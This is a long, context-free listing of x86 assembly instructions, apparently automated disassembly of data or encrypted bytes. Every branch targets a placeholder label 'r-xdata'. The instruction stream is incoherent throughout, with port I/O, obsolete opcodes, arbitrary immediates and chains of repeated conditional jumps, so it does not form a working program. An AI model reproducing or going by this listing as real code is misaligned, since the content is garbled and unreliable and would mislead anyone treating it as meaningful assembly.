mov [ ecx + edi * 4 - 0x1c2a93f6 ] ecx
or esp ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
sbb ebx [ esp + ebx ]
sbb al 0xb3
push 0xc77c0b25
jecxz r-xdata
sbb al 0x96
mov ah 0xff
mov al 0xa
salc
leave
jecxz r-xdata
outsb
push esp
not [ edx + 0x605c996e ]
sbb al 0xfa
in al dx
loopne r-xdata
mov ah 0xec
pop es
and al 0xa6
jae r-xdata
push ds
jae r-xdata
or bl [ ebx ]
shl ebx cl
jecxz r-xdata
xchg ebx eax
mov dl al
shl [ 0x1ce30ba6 ] 0x1
mov ch 0xab
outsb
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
xor al [ ebp - 0x46c64996 ]
mov edx edx
test [ edx - 0x4a ] ebp
cmp [ eax + 0x25 ] ebp
or ah [ ebx ]
fucom st3
jecxz r-xdata
push 0xa66a8522
jae r-xdata
jecxz r-xdata
mov esp edi
outsb
in eax 0x6e
jae r-xdata
daa
retn
or ebp [ 0x60e3e3c1 ]
or bl [ esi + 0x73e3e3dd ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
mov bl 0xa
mov esi 0x85e3e3e6
outsb
sbb al 0xb
sub esp 0xffffffe3
jecxz r-xdata
and al 0xa6
pop ss
jecxz r-xdata
jecxz r-xdata
push 0x65
jae r-xdata
jecxz r-xdata
jae r-xdata
pushfd
retn
mov ecx 0x1c14ed0a
push 0xb66a8532
cmp [ ecx + 0x6a85d289 ] edi
mov dh 0x3f
aas
jae r-xdata
xchg ecx eax
or ch ah
jae r-xdata
jae r-xdata
aam 0xe3
jae r-xdata
sahf
mov ebx 0x6a858e89
cmpsb [ esi ] [ edi ]
das
mov ebx 0xab98c89
insb
sahf
out 0xe3 eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
add esi [ ebx - 0x7dfc59dc ]
xchg [ ebp + 0x7a62482 ] edx
adc esp ebx
jae r-xdata
pop edx
fsubrp st3
jecxz r-xdata
aaa
mov ebx 0x24b58d86
cmpsb [ esi ] [ edi ]
sbb al 0x73
or ch ch
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov edi esp
mov al 0xb0
mov al 0xa
aaa
jecxz r-xdata
jae r-xdata
mov ch 0x87
pushad
sbb ebx [ esp + ebp * 8 ]
in al dx
movsd [ di ] [ si ]
mov bl 0x1c
je r-xdata
adc al 0x1c
jae r-xdata
xchg ebp eax
and [ esi ] 0x7
cmpsb [ esi ] [ edi ]
and esi [ ebx + 0x1ebf666e ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov edx esp
test [ esi + 0x23 ] esp
jecxz r-xdata
shl ebx cl
jecxz r-xdata
movsd [ edi ] [ esi ]
mov esp edi
loop r-xdata
das
cmpsb [ esi ] [ edi ]
jecxz r-xdata
or ebp [ esi - 0x4c1c1c3a ]
sbb al 0xb5
xchg [ eax + 0x1b ] esp
sbb al 0xec
push ds
jae r-xdata
fsub [ ebp + 0x5c60ece5 ]
sbb bl [ esp + ebx ]
push 0xf80a1fae
in eax 0xe3
jecxz r-xdata
mov ah 0xe5
outsb
cmpsd [ esi ] [ edi ]
fnstsw ax
in al dx
mul bl
cmp ebp [ esi + 0xa91808a ]
in al dx
and al 0xa6
jecxz r-xdata
loop r-xdata
jecxz r-xdata
sbb al 0xb3
jae r-xdata
mov edi [ ebp + eax * 4 - 0x76f06196 ]
test [ ebp + eax * 4 + 0xa0d9e6a ] bh
or eax 0x73e3e3c8
jae r-xdata
jae r-xdata
pushad
lahf
or bh [ esi - 0x7a1c1c1a ]
mov bl 0x6e
mov di 0x1c1e
sbb al 0xb3
loopne r-xdata
jecxz r-xdata
mul bl
out dx al
movsd [ edi ] [ esi ]
jecxz r-xdata
mov bl 0x1c
jne r-xdata
outsb
jae r-xdata
sbb al 0x1c
or edx [ ebp + edx * 8 - 0x1d ]
jecxz r-xdata
test [ edx - 0x62 ] ebp
xchg [ edi ] bl
jecxz r-xdata
outsb
in al dx
shl [ di - 0x1c1d ] cl
test [ eax - 0x68 ] esp
movsd [ edi ] [ esi ]
jecxz r-xdata
in al dx
push esp
mov al [ 0x236685cf ]
mov al [ eax - 0xf13f56f ]
jecxz r-xdata
pushad
jecxz r-xdata
jecxz r-xdata
push edi
jae r-xdata
retn
cmpsb [ esi ] [ edi ]
or dh [ ebx - 0x5d ]
jecxz r-xdata
outsb
outsb
push ebx
push ds
test eax 0x73e3e3f9
jae r-xdata
or ch [ ebx + ebx * 8 ]
jecxz r-xdata
mov bl 0x1c
mov ch 0xcf
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0x1c
mov ch 0x87
shr [ edx ] 0x1
or bh [ ebx - 0x21 ]
jecxz r-xdata
jecxz r-xdata
mov bl 0x68
and eax 0xe3c77c0b
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jns 0x6acbd714
jae r-xdata
jae r-xdata
or bh [ 0x73e3e3e8 ]
jae r-xdata
ficomp [ edi + 0x66ecd7c7 ]
jl r-xdata
or cl [ 0x73e3e3c8 ]
outsb
loop r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
pushfd
jmp edx
xchg eax edx
sub cl [ edx ]
jpo r-xdata
and ebp esp
out dx eax
or ah dh
jecxz r-xdata
pop es
sbb al 0xb4
push [ eax - 0x1c3629f6 ]
jecxz r-xdata
xchg esi eax
sahf
call 0xffffffffa820ff04
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
fwait
loop r-xdata
mov al 0xa
push es
shl ebx cl
jecxz r-xdata
sbb eax 0x39e6a85
rcr [ eax * 4 - 0x43fe6196 ] 0x1
test [ edx - 0x62 ] ebp
jae r-xdata
push ds
jae r-xdata
jae r-xdata
jecxz r-xdata
loope r-xdata
jecxz r-xdata
jae r-xdata
fninit
jecxz r-xdata
fisub [ edi + 0x67ecffc7 ]
out 0xe3 eax
jecxz r-xdata
mov al 0xa
jecxz r-xdata
jae r-xdata
outsb
or eax 0xe3c80d0a
jecxz r-xdata
test [ edx - 0x62 ] ebp
sahf
pop ebx
jecxz r-xdata
sbb al 0xb5
iretd
add [ ebp + eax * 4 - 0x76f46196 ] edi
push 0xffffff9e
jae r-xdata
jecxz r-xdata
sbb al 0xb
jae r-xdata
outsb
jae r-xdata
sbb al 0x75
ja r-xdata
jecxz r-xdata
jecxz r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
or al dh
in eax 0xe3
jecxz r-xdata
arpl [ ebx + 0x410ab0b0 ] si
push ds
jae r-xdata
jecxz r-xdata
mov ah 0x1c
mov ch 0xeb
in al dx
push esp
mov al [ 0x1c20e0a5 ]
push ebx
or ecx [ ecx + 0x6a85bc8e ]
sahf
or [ ecx + 0x6a85bc8b ] ecx
sahf
push 0xffffff9e
jae r-xdata
jae r-xdata
push 0xffffffa5
jecxz r-xdata
jae r-xdata
add edx eax
jae r-xdata
push esp
aad 0xe3
jae r-xdata
aas
mov bl 0xa
jae r-xdata
mov ebx 0xe3e70f0a
jecxz r-xdata
jecxz r-xdata
cmp eax 0x731c1c14
jmp r-xdata
jae r-xdata
jecxz r-xdata
lea eax [ ebp - 0x44fc5996 ]
jae r-xdata
jecxz r-xdata
cmpsd [ esi ] [ edi ]
or esp [ esi ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jne r-xdata
sbb al 0x1c
mov al 0xb0
bound ecx [ edi ]
iretd
jne r-xdata
in al dx
arpl dx dx
jecxz r-xdata
or bh [ 0x731c1c14 ]
or al ch
jecxz r-xdata
sbb al 0x85
push 0xffffff9e
lahf
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
or esp [ edi + 0x1b ]
sbb al 0x1c
and edi [ ebp - 0x1c36bcf6 ]
jecxz r-xdata
pop ebx
jecxz r-xdata
or al bh
iretd
jae r-xdata
or al [ esi - 0x5 ]
outsb
pop ebx
jae r-xdata
pop esp
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
retn
push 0xec1c661b
push 0x9e6a851d
jae r-xdata
mov [ ebp + 0x3a66a85 ] ecx
jae r-xdata
and cx [ edx ]
rcl ebx 0xe3
jecxz r-xdata
jae r-xdata
salc
adc eax 0x961c1c1c
out dx eax
sbb al 0x96
jmp r-xdata
sbb esp [ esi + 0x1c ]
in al dx
jae r-xdata
cmpsb [ esi ] [ edi ]
or dh [ 0x6ee3e3db ]
mov ah 0xa
sbb al 0xec
mov eax 0xb4136996
or al [ ecx + 0x1e ]
xor eax 0x6ee3e3db
or ch cl
add edi [ ebx - 0x1c18f0f6 ]
jae r-xdata
sbb al 0xb5
jmp r-xdata
scasb [ edi ]
aas
or edx [ esi - 0x29 ]
scasb [ edi ]
aaa
outsb
cmpsb [ esi ] [ edi ]
daa
or ebp [ esi - 0x22 ]
fsubrp st3
jecxz r-xdata
jae r-xdata
jecxz r-xdata
in al dx
dec dx
or cl [ edi ]
jecxz r-xdata
or ch [ edx + 0x73e3e3d0 ]
jae r-xdata
mov [ 0x7373e3e3 ] eax
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
or ebx esp
salc
push 0x65
dec edi
jecxz r-xdata
jecxz r-xdata
jae r-xdata
salc
or dl [ esi + esi * 8 ]
jecxz r-xdata
out 0xe3 al
jecxz r-xdata
and bp sp
jecxz r-xdata
push esi
xlat
jge r-xdata
and ebp esp
push 0x6a0ab20f
sbb eax 0x68731c1c
scasb [ edi ]
jmp r-xdata
push 0xffffffb6
and edi [ ecx + 0x6a859b89 ]
mov dh 0x21
mov ecx 0x6a859589
jmp 0x7429fee1
jecxz r-xdata
inc esi
sti

or dl dh
jae r-xdata
shl bl 0x1
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ds
push 0xa6d81fa6
sbb ebp esp
popad
cmp ebx [ esp + ebx ]
sbb al 0xa
stosb [ edi ]
or dh [ edx + 0x68e3e3e6 ]
out 0xe2 eax
jecxz r-xdata
and [ ebx + edx * 2 ] bl
jecxz r-xdata
push 0xffffffa5
mov edi [ eax - 0x4bec966a ]
out 0xe3 eax
jae r-xdata
sbb al 0x74
pop ss
jecxz r-xdata
jae r-xdata
mov dh 0xeb
outsb
sub bx [ esi ]
jecxz r-xdata
mov esp 0x2660b8bd
xchg edi eax
in al dx
mov ch 0xeb
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
scasd [ edi ]
or edi ebp
retn
movsd [ edi ] [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
and bp sp
jae r-xdata
sbb al 0x1c
or bl [ eax - 0x3e ]
jecxz r-xdata
sub ebx [ esi ]
shl [ ebx ] 0x1
sub ah [ eax ]
or edi [ esi - 0x17 ]
jecxz r-xdata

or dl ah
shl ebx 0xe3
jae r-xdata
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
and eax 0xa8a89b9
mov al [ 0x73e3e3e0 ]
mov [ ebp + 0x27b66a85 ] edx
or bh al
retn 0xe3e3
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
and al 0xbc
mov ebp 0x972660b8
jae r-xdata
mov ebp 0x73202ab8
jae r-xdata
push ds
in al dx
jae r-xdata
loopne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
mov dh 0x27
shl si 0x1
jecxz r-xdata
sbb eax 0xd8e3e3f5
jae r-xdata
jae r-xdata
test bl cl
jecxz r-xdata
jae r-xdata
or ah [ eax + 0x73e3e3e0 ]
mov bl 0xb2
or dh [ ebp - 0x24 ]
jecxz r-xdata
jae r-xdata
push 0x69e7c7a7
jmp r-xdata
dec esp
xlat
mov bl 0x70
or bl [ ecx + edi * 8 + 0x7373e3e3 ]
jmp r-xdata
jecxz r-xdata
fcom st6
and [ edx ] cl
jmp r-xdata
or bl [ 0xffffffffd8e3e3f5 ]
jecxz r-xdata
outsb
mov bl 0xa
jae r-xdata
push 0x60f3c7b7
and edi esp
outsb
sbb al 0xb3
jae r-xdata
cmc
fsub [ eax ]
or ch bl
mul bl
jecxz r-xdata
jae r-xdata
in al dx
jae r-xdata
mov ecx esp
mov ebx [ ebx ]
das
or esi edi
adc eax 0x66ba1c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jge r-xdata
jae r-xdata
loope r-xdata
jecxz r-xdata
push ss
jae r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi esp
jae r-xdata
mov ah 0xf3
or cl [ edx + 0x731c1c10 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov [ 0x2ab8bdbc ] eax
cmp esp esi
jecxz r-xdata
sbb eax 0x73731c1c
or dl dl
sbb al 0xba
jae r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c1e620a ] eax
sbb al 0x6b
mov edi 0x640a44f6
mov edx 0x67ec2366
push ds
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
dec ebx
enter 0xe3e3 0x73
jae r-xdata
das
mov al 0xb0
and bp sp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
or ebp [ edx + 0x16 ]
add [ ebp + 0xa01a66a ] 0xe3e3fbd5
or ah [ ebx ]
out dx al
jecxz r-xdata
mov bl 0x68
and eax 0x1c166a0b
aas
or bh [ ebx ]
out 0xe3 al
jecxz r-xdata
daa
jae r-xdata
mov bl 0x89
loope r-xdata
jae r-xdata
mov [ 0x1c89e3e3 ] al
jmp r-xdata
shl [ ebx - 0x69e31c1d ] cl
jae r-xdata
cmp [ di ] bl
in al dx
jae r-xdata
scasd [ edi ]
mov ah 0xb3
or ebx [ ebx - 0x20 ]
jae r-xdata
or al [ edi - 0x7 ]
jge r-xdata
fwait
push ds
sbb al 0x1c
mov bl 0xb0
sbb al 0xb4
mov bl 0xd8
and ah ch
jpo r-xdata
jae r-xdata
in al dx
stosb [ di ]
mov al 0xa
inc edi
mov esp 0x202ab8bd
jae r-xdata
pop esp
and cx [ edx ]
jae r-xdata
and ebp esp
loopne r-xdata
not [ 0x66ba1c1c ]
fsubr [ edx - 0x1c5d30f6 ]
jecxz r-xdata
sbb ebp [ edi ]
jae r-xdata
jae r-xdata
cmp [ 0x1cd01c1c ] bl
jae r-xdata
jecxz r-xdata
pushad
mov ebx esp
or ah [ esi + edx * 8 + 0x2360e3e3 ]
loope r-xdata
pushfd
jmp r-xdata
jae r-xdata
sbb al 0x1c
mov [ edi - 0x59957a45 ] edi
push ds
jae r-xdata
out 0xe3 eax
or ch [ edi ]
jae r-xdata
and al 0xb3
push 0xbcbc7a7
cmp ebp eax
jecxz r-xdata
jae r-xdata
mov ah 0x6a
push 0xffffffa6
stc
mov ebx 0xe3d39a0a
jecxz r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ah dl
jae r-xdata
pushad
fninit
or bl [ edx + 0x13 ]
sbb al 0x1c
loopne r-xdata
outsb
jae r-xdata
cmpsb [ esi ] [ edi ]
mov bl 0xb5
sbb al 0x97
shl [ ebx ] 0x1
sbb al 0x89
jae r-xdata
jae r-xdata
pop ss
mov ebx 0x1c14e20a
test [ edx - 0x5a ] ebp
mov edx 0x63e38bba
jecxz r-xdata
sti
jecxz r-xdata
sbb al 0x6e
push es
mov esi 0x73737320
jae r-xdata
pushad
pop ebx
jae r-xdata
rcr [ edx + ecx ] 0x1
sbb al 0x74
jpo r-xdata
jae r-xdata
vpavgw xmm4 xmm0 xmm3
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
xchg edi eax
mov edi 0xa66a85bb
jae r-xdata
jecxz r-xdata
jae r-xdata
adc al 0x1c
mov ah 0xb3
fsub [ eax ]
jae r-xdata
mov al 0x1c
xchg esi eax
jae r-xdata
jecxz r-xdata
or dh [ eax + 0x731c1c1d ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov bl 0x68
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
rcr [ esi + ebp * 2 ] 0x1
jae r-xdata
jae r-xdata
daa
out dx eax
mov ebx esi
outsb
jecxz r-xdata
and esp ecx
test [ eax - 0x25 ] esp
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg esi eax
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
and esp [ ebx + 0x2ab8bdbc ]
or cl [ ebx - 0x431c1c5a ]
mov ebp 0xbe0668b8
jae r-xdata
loop r-xdata
or al ch
stc
jecxz r-xdata
jae r-xdata
daa
out dx eax
mov ch 0xa
xchg [ esi ] edx
sbb al 0x1c
jae r-xdata
jae r-xdata
or ch al
retn 0xe3e3
pop edx
adc ebx [ esp + ebx ]
jpo r-xdata
movsd [ edi ] [ esi ]
loope r-xdata
bound ecx [ edi ]
arpl cx sp
fbstp [ ebx + esi * 4 - 0x1c1fb4f5 ]
jae r-xdata
out dx eax
jae r-xdata
jae r-xdata
jae r-xdata
loopne r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
shr [ esi + 0x66 ] cl
jae r-xdata
mov bl 0xa
outsb
cmpsb [ esi ] [ edi ]
dec ebx
mov al 0xb3
or esp [ eax ]
loope r-xdata
test [ edx - 0x4a ] ebp
or [ ecx - 0x1c0d34f6 ] edi
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
or cl [ edx + 0x731c1c10 ]
or cl [ ebx - 0x38 ]
jecxz r-xdata
outsb
inc edi
stc
mov [ 0xffffffff961ce3e3 ] eax
das
and ecx [ edx ]
jae r-xdata
sbb al 0x96
adc ecx [ edx ]
shl [ edi + 0x7373e3e3 ] 0xb3
sbb al 0x96
jae r-xdata
mov edx 0xe363e38b
jecxz r-xdata
mov ebp ecx
test [ edx - 0x5a ] ebp
int1
mov ebx 0x6a859589
cmpsb [ esi ] [ edi ]
mov ebx 0xf3a66a85
shl [ ebx ] 0x1
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
sbb al 0x1c
mov bl 0x1c
mov ch 0xcf
or ch [ esi ]
adc al 0x1c
sub bx [ esi ]
pushad
jae r-xdata
jae r-xdata
mov ch 0x89
retn
jecxz r-xdata
xchg esi eax
jae r-xdata
jecxz r-xdata
mov dh 0x9
mov ecx 0xe3f2cb0a
and bp sp
jecxz r-xdata
jae r-xdata
jae r-xdata
or ah [ ebp - 0x7 ]
jecxz r-xdata
sbb al 0x73
jae r-xdata
mov bl 0xb
dec ebx
loopne r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa6

push 0xffffffa5
or [ eax + 0x2b ] ebp
test [ edx - 0x52 ] ebp
scasb [ edi ]
pushad
and dh bh
push 0xffffffae
jmp 0xffffffffd12a0498
mov ch 0xb5
or ah ch
sti
mov [ esi - 0x1c0e9bf6 ] eax
jecxz r-xdata
or cl [ esi + 0x73e3e3f2 ]
out dx eax
pop ds
mov bl 0xb4
sbb al 0x96
jae r-xdata
mov al 0x1c
jae r-xdata
or ah [ edx - 0x3f ]
jecxz r-xdata
jecxz r-xdata
or al [ edi - 0x3b ]
jecxz r-xdata
mov bl 0xb4
push 0xffffffbe
adc ecx [ ebx ]
mov [ 0x60e3e3ca ] eax
push 0x16
jae r-xdata
mov esi 0xcaa30b13
jecxz r-xdata
jae r-xdata
stosb [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
or al dh
cli
jecxz r-xdata
sbb al 0xa6
jae r-xdata
jecxz r-xdata
movsb [ edi ] [ esi ]
salc
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
pop ds
or al [ ecx + 0x731c1c11 ]
sbb al 0xce
mov esp 0x19b80ab8
sbb al 0x1c
mov ah 0x68
sahf

cmpsb [ esi ] [ edi ]
push 0xffffffb6
or edi [ ecx + 0x6a859189 ]
fyl2x
jae r-xdata
mov ch 0xd7
mov al 0x1c
mov ch 0xdf
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
mov esp [ esi - 0x42431c1d ]
mov eax 0x20be0668
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
shl ebx 0xe3
iretd
mov ah 0x5c
jae r-xdata
jae r-xdata
jae r-xdata
fld1
jecxz r-xdata
in al dx
popad
pop edi
pop ds
pushad
jae r-xdata
pushad
jae r-xdata
sbb al 0x75
jae r-xdata
mov eax esp
mov [ 0x6ab4b88b ] al
mov [ 0x1c11cd0a ] eax
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
dec ebx
and al 0xa6
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
mov edx 0x67ec2366
jae r-xdata
mov [ ebx + esi * 4 ] ebx
jae r-xdata
ficomp [ esi + 0x2377ec1f ]
jae r-xdata
sahf
pop ds
loopne r-xdata
sbb al 0x74
add esp ebx
jecxz r-xdata
mov [ 0x7373e3e3 ] al
jae r-xdata
jecxz r-xdata
dec edi
jae r-xdata
jae r-xdata
jecxz r-xdata
and ebp esp
jae r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
xchg [ esp + ebx - 0x1c1cac8b ] esi
retn 0xe3c1
jecxz r-xdata
cmpsb [ esi ] [ edi ]
xor esi [ ebx - 0x4c985992 ]
mov ch 0xb5
mov ebx eax
mov ch 0xa
sbb bl ah
jecxz r-xdata
and ebp esp
jae r-xdata
0xe3e3
jecxz r-xdata
packsswb mm4 mmx1
pop ds
jae r-xdata
mov al [ 0x2b68e3e3 ]
or ah [ edx - 0x60 ]
jecxz r-xdata
outsb
and bp sp
push 0xbe6a853c
jae r-xdata
mov al 0x6a
cmpsb [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
mov bl 0x68
and eax 0x1c118f0b
sbb al 0xba
mov eax 0x1c19b80a
sbb al 0xb4
push 0xa66ef39e
add [ edx + edi * 4 - 0x45 ] ebp
jecxz r-xdata
mov eax [ ecx ]
insb
mov edx 0x656ab4bb
jpo r-xdata
or ch [ edx - 0x1f ]
jecxz r-xdata
aas
mov eax 0x6a858089
mov esi 0x8539683d
push 0xffffffbe
add edi [ eax + 0x1c0da30a ]
sbb al 0x73
push 0xbe6a853b
jae r-xdata
jecxz r-xdata
and esp [ ebx - 0x1c0c43f6 ]
push 0xe17d0b1d
jecxz r-xdata
sti
sbb [ esp + ebx ] ebx
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
btr [ edx ] ecx
mov ah 0xa
test al al
jecxz r-xdata
jae r-xdata
or ebp [ eax + 0xaa8aeb5 ]
push ss
sbb ebx [ esp + ebx ]
jae r-xdata
pushad
jae r-xdata
mov esp 0xc4500ab8
jecxz r-xdata
ja r-xdata
mov dh 0xa
mov dh 0x68
lss esi [ edx - 0x219ff54c ]
mov ebx 0x6a8538d0
mov esi 0x853c68b9
push 0xffffffbe
sub ecx [ edx ]
or esi ecx
in al dx
jecxz r-xdata
sar ecx 0x1
mov ebp ss
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
mov ah 0x6a
jpo r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3a2fb0a ] eax
jae r-xdata
sbb al 0x73
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ eax ]
retn 0xe3e3
and edi [ eax + edi * 4 - 0x1c3baff6 ]
jecxz r-xdata
jae r-xdata
sbb al 0xb5
or ch [ edi ]
sbb eax 0x1cd01c1c
jae r-xdata
push 0xffffffbe
jae r-xdata
movsd [ edi ] [ esi ]
xlat
or al [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
and bp sp
imul dx bp 0xffe3
jecxz r-xdata
or ecx [ edi - 0x45e3e3ef ]
mov ah 0xa
sar [ eax ] 0x1
mov ch 0xd8
sbb [ edx ] cl
jae r-xdata
jae r-xdata
jae r-xdata
or ecx ebx
clc
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x6a853968
mov esi 0xa30ab803
or eax 0x73731c1c
jae r-xdata
push 0xffffffbe
jae r-xdata
jg r-xdata

das
fsub [ ebp + 0x19800ad7 ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
jae r-xdata
in al dx
jae r-xdata
fyl2x
jae r-xdata
jecxz r-xdata
mov bl 0x1c
mov ch 0xd3
outsb
sbb al 0xd0
sbb al 0xa
jae r-xdata
out dx al
jecxz r-xdata
jecxz r-xdata
push 0xb4b2b20f
or ah [ eax - 0x22 ]
jae r-xdata
jae r-xdata
push 0xffffffbe
cmp eax [ ebp - 0x2f444196 ]
cmp [ ebp + 0x68b9be6a ] al
jecxz r-xdata
mov [ ebx - 0x1c5d04f6 ] esp
jae r-xdata
cmp al 0x85
jecxz r-xdata
push 0xce090a2b
or edi edx
push 0x73e3e3a2
pushad
sbb bh [ edi - 0x1c1161f6 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
mov ecx 0x6a853c68
mov esi 0x8089b83f
test [ edx - 0x42 ] ebp
jae r-xdata
in al dx
int1
jae r-xdata
cmpsd [ esi ] [ edi ]
je r-xdata
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
bound ecx [ edi ]
lahf
out 0xe3 eax
jecxz r-xdata
sti
ja r-xdata
sbb al 0x8b
int3
push 0xed800a1b
jecxz r-xdata
jae r-xdata
jbe r-xdata
xchg sp ax
sbb [ esp + ebx ] bl
shl [ ebx ] 0x1
or dh bh

pushad
jecxz r-xdata
mov ch 0xa
in eax 0xfb
or dl [ 0x69731c1c ]
in eax 0xa
sub eax 0x73e3e3c2
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ edi + 0x53751cb4 ] eax
jecxz r-xdata
pushad
sbb ecx [ edx ]
sub ch 0xe3
jecxz r-xdata
jecxz r-xdata
sbb [ esp + ebp * 8 ] bl
pop es
adc ebp [ ebx - 0x5a ]
jae r-xdata
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
mov dh 0x68
fsub st3
jecxz r-xdata
xchg [ edi ] al
jecxz r-xdata
jae r-xdata
jge r-xdata
sbb al 0x1c
mov ecx esp
mov edx 0x6ab07d06
push 0x7d
xor esp ebx
jecxz r-xdata
jae r-xdata
xor [ bx ] bl
sbb al 0x1c
in al dx
sti
jecxz r-xdata
mov ah 0xb
cli
out 0xe3 eax
jecxz r-xdata
push ds
sbb al 0x1c
push 0x77
jmp r-xdata
adc al 0x1c
push 0xffffffae
or esp [ edi + eax * 8 - 0x59951c1d ]
sub ebx [ esi ]
or cl ch
adc [ esp + ebx ] ebx
jae r-xdata
fstp st0
and ebx edx
sahf
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx ]
jae r-xdata
jae r-xdata
adc [ 0xffffffffa6681c1c ] bl
jae r-xdata
add ebp [ esi - 0x52 ]
jae r-xdata
jecxz r-xdata
adc esi ebp
or ch [ eax - 0x5e ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb ebx [ esp + ebx ]
and bp sp
jae r-xdata
and al 0xa6
jae r-xdata
jae r-xdata
cmc
jae r-xdata
mov dh 0x68
lss esi [ edx + 0x1c1b8a0a ]
sbb al 0x73
jae r-xdata
or ebx [ bp + di ]
sbb al 0x1c
or al [ edx + 0x73e3e3cd ]
jae r-xdata
add bh bh
jecxz r-xdata
salc
pop es
scasb [ edi ]
jae r-xdata
jecxz r-xdata
into
jae r-xdata
jae r-xdata
push 0xe4d90a25
jecxz r-xdata
imul esp [ esi + 0x3a66b13 ] 0x6e
adc bh dh
mov ah [ ebx - 0x1cd8abe4 ]
jecxz r-xdata
push ss
sbb al 0x1c
jae r-xdata
pop ss
shl [ ebx ] 0x1
mov [ 0xffffffffe3f3bc0a ] eax
jae r-xdata
jae r-xdata
setg bh
jecxz r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffff9f
jae r-xdata
jecxz r-xdata
insd
and al 0xa6
mov dh 0x68
punpckldq mmx1 [ edi ]
iretd
or edi ebp
jae r-xdata
or esi [ ebp + 0xab5a8ae ]
and al 0xa6
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
and esp [ edi - 0x1d ]
jecxz r-xdata
fsubrp st3
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb0
or cl [ 0x73e3e3f4 ]
or dl [ edi ]
mov dl 0xb2
or cl [ edx + 0x731c1c1b ]
or edi [ eax ]
sbb al 0x1c
sbb al 0xb3
or ch [ edi + 0x731c1c19 ]
jae r-xdata
pop edi
jecxz r-xdata
push 0xccdc0a0f
jecxz r-xdata
or dh al
jae r-xdata
or ah [ ebx + 0x731c1c0d ]
pushad
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ah [ ebx ]
cmpsb [ esi ] [ edi ]
sbb edx eax
shl [ 0x1ce319a6 ] 0x1
jecxz r-xdata
jecxz r-xdata
push 0xe5f10a13
jecxz r-xdata
and [ ebx + 0x68 ] dh
and ch [ edx ]
and [ esp + esi * 2 ] bl
jae r-xdata
daa
push 0x1c1e3f76
sbb al 0x6a
mov ch 0xb4
jae r-xdata
jecxz r-xdata
